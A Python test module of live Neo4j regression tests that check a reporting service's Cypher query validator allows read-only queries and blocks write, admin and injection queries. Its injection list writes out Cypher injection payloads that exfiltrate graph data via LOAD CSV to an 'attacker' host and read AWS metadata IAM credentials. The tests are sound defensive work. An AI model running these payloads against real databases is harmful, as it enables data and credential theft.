"""Live Neo4j regression tests for query validation.

These tests intentionally do not mock the Neo4j driver. Dangerous queries are
validated through EXPLAIN by validate_query(), so write/schema cases should be
planned but not executed.
"""

from collections.abc import Iterable
from typing import Any

import pytest

from reporting.services import reporting_neo4j
from reporting.services.query_validator import validate_query
from reporting.services.reporting_neo4j import _get_async_neo4j_client
from tests.unit.reporting.services.query_validator_test import (
    ADMIN_COMMAND_FUZZ_CASES,
    DANGEROUS_READ_PATH_FUZZ_CASES,
    READ_ONLY_CALL_SUBQUERY_CASES,
    WRITE_QUERY_TYPE_FUZZ_CASES,
)


@pytest.fixture(autouse=True)
async def reset_neo4j_driver_caches() -> None:
    if reporting_neo4j._ASYNC_CLIENT_CACHE is not None:
        await reporting_neo4j._ASYNC_CLIENT_CACHE.close()
    if reporting_neo4j._SYNC_CLIENT_CACHE is not None:
        reporting_neo4j._SYNC_CLIENT_CACHE.close()
    reporting_neo4j._ASYNC_CLIENT_CACHE = None
    reporting_neo4j._SYNC_CLIENT_CACHE = None
    yield
    if reporting_neo4j._ASYNC_CLIENT_CACHE is not None:
        await reporting_neo4j._ASYNC_CLIENT_CACHE.close()
    if reporting_neo4j._SYNC_CLIENT_CACHE is not None:
        reporting_neo4j._SYNC_CLIENT_CACHE.close()
    reporting_neo4j._ASYNC_CLIENT_CACHE = None
    reporting_neo4j._SYNC_CLIENT_CACHE = None


async def _neo4j_versions() -> tuple[set[str], set[str]]:
    driver = _get_async_neo4j_client()
    records, _, _ = await driver.execute_query("CALL dbms.components() YIELD name, versions RETURN name, versions")
    components: dict[str, set[str]] = {record["name"]: set(record["versions"]) for record in records}
    return components.get("Neo4j Kernel", set()), components.get("Cypher", set())


@pytest.fixture
async def cypher_versions() -> set[str]:
    _, versions = await _neo4j_versions()
    return versions


async def _assert_allowed(query: str, params: dict[str, object] | None = None) -> None:
    result = await validate_query(query, params=params)
    assert not result.has_errors, (
        f"Expected query to be allowed but it was blocked.\n"
        f"query: {query!r}\n"
        f"errors: {result.errors}\n"
        f"warnings: {result.warnings}"
    )


async def _assert_blocked(query: str, params: dict[str, object] | None = None) -> None:
    result = await validate_query(query, params=params)
    assert result.has_errors, (
        f"Expected query to be blocked but it was allowed.\nquery: {query!r}\nwarnings: {result.warnings}"
    )


def _query_param(param: Any, index: int = 0) -> object:
    return param.values[index]


def _case_id(param: Any) -> str | None:
    return param.id


def _as_query_params(cases: Iterable[Any], value_index: int = 0) -> list[Any]:
    return [pytest.param(_query_param(case, value_index), id=_case_id(case)) for case in cases]


READ_ONLY_QUERIES = [
    pytest.param("MATCH (n) RETURN n LIMIT 1", id="match-limit"),
    pytest.param("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m LIMIT 1", id="optional-match"),
    pytest.param("UNWIND [1, 2, 3] AS x RETURN x", id="unwind"),
    pytest.param("MATCH (n) WHERE n.name = $name RETURN n LIMIT 1", id="params"),
]


CYPHER_25_BLOCKED_EXTRA_QUERIES = [
    pytest.param("CYPHER 25 FOR x IN [1,2] CREATE (:SeizuLiveValidatorProbe {id: x})", id="cypher25-for-create"),
    pytest.param(
        "CYPHER 25 FOR x IN [1,2] RETURN x NEXT CREATE (:SeizuLiveValidatorProbe {id: x})",
        id="cypher25-next-create",
    ),
    pytest.param(
        "CYPHER 25 WHEN true THEN CREATE (:SeizuLiveValidatorProbe {id: 'when'}) RETURN 1 AS x ELSE RETURN 2 AS x",
        id="cypher25-when-create",
    ),
    pytest.param("CYPHER 25 RETURN ai.text.tokenCount('secret', 'OpenAI', {}) AS tokens", id="cypher25-ai-text"),
    pytest.param(
        "CYPHER 25 RETURN `genai`.`vector`.`encode`('secret', 'OpenAI', {}) AS embedding",
        id="cypher25-genai-vector-quoted",
    ),
    pytest.param(
        "CYPHER 25 ALTER CURRENT GRAPH TYPE ADD { (:Company => {name :: STRING IS UNIQUE}) }",
        id="cypher25-alter-graph-type",
    ),
]

NEO4JECTION_BLOCKED_QUERIES = [
    pytest.param(
        "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-or-true-load-csv",
    ),
    pytest.param(
        "'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //",
        id="neo4jection-property-filter",
    ),
    pytest.param(
        "'}) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-property",
    ),
    pytest.param(
        "a) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-label",
    ),
    pytest.param(
        "']}]-( ) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-relationship",
    ),
    pytest.param(
        "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
        "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0",
        id="neo4jection-label-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
        "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l RETURN 0 as _0 //",
        id="neo4jection-property-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 0 as _0 MATCH (n) "
        "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l RETURN 0 as _0 //",
        id="neo4jection-json-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
        "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) as l RETURN 1 //",
        id="neo4jection-apoc-systemdb",
    ),
    pytest.param(
        "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
        '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
        "UNWIND names AS name LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //",
        id="neo4jection-apoc-cypher-function",
    ),
    pytest.param(
        "LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
        "AS roles UNWIND roles AS role "
        "LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l RETURN l",
        id="neo4jection-imdsv1",
    ),
    pytest.param(
        'CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", '
        '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list '
        "WITH list[0] as token RETURN token",
        id="neo4jection-imdsv2-apoc",
    ),
    pytest.param(
        "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
        'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //',
        id="neo4jection-unicode-quote",
    ),
]

UNIT_DANGEROUS_READ_PATH_QUERIES = _as_query_params(DANGEROUS_READ_PATH_FUZZ_CASES)
UNIT_WRITE_QUERIES = _as_query_params(WRITE_QUERY_TYPE_FUZZ_CASES, value_index=1)
UNIT_READ_ONLY_CALL_SUBQUERY_QUERIES = _as_query_params(READ_ONLY_CALL_SUBQUERY_CASES)
UNIT_ADMIN_COMMAND_QUERIES = _as_query_params(ADMIN_COMMAND_FUZZ_CASES)


@pytest.mark.parametrize("query", READ_ONLY_QUERIES)
async def test_live_read_only_queries_are_allowed(query: str) -> None:
    params = {"name": "test"} if "$name" in query else None
    await _assert_allowed(query, params=params)


async def test_live_missing_parameter_is_not_blocking() -> None:
    result = await validate_query("MATCH (n) WHERE n.name = $name RETURN n LIMIT 1")
    assert not result.has_errors


@pytest.mark.parametrize("query", UNIT_WRITE_QUERIES)
async def test_live_unit_write_family_queries_are_blocked(query: str) -> None:
    await _assert_blocked(query)


@pytest.mark.parametrize("query", UNIT_DANGEROUS_READ_PATH_QUERIES)
async def test_live_unit_dangerous_read_path_family_queries_are_blocked(query: str) -> None:
    await _assert_blocked(query)


@pytest.mark.parametrize("query", UNIT_ADMIN_COMMAND_QUERIES)
async def test_live_unit_admin_command_family_queries_are_blocked(query: str) -> None:
    await _assert_blocked(query)


@pytest.mark.parametrize("query", NEO4JECTION_BLOCKED_QUERIES)
async def test_live_neo4jection_family_queries_are_blocked(query: str) -> None:
    await _assert_blocked(query)


@pytest.mark.parametrize("query", UNIT_READ_ONLY_CALL_SUBQUERY_QUERIES)
async def test_live_unit_read_only_call_subquery_family_queries_are_allowed(
    cypher_versions: Iterable[str], query: str
) -> None:
    if query.startswith("CYPHER 25") and "25" not in cypher_versions:
        pytest.skip("active Neo4j does not advertise Cypher 25")
    await _assert_allowed(query)


@pytest.mark.parametrize("query", CYPHER_25_BLOCKED_EXTRA_QUERIES)
async def test_live_cypher25_extra_dangerous_queries_are_blocked(cypher_versions: Iterable[str], query: str) -> None:
    if "25" not in cypher_versions:
        pytest.skip("active Neo4j does not advertise Cypher 25")
    await _assert_blocked(query)
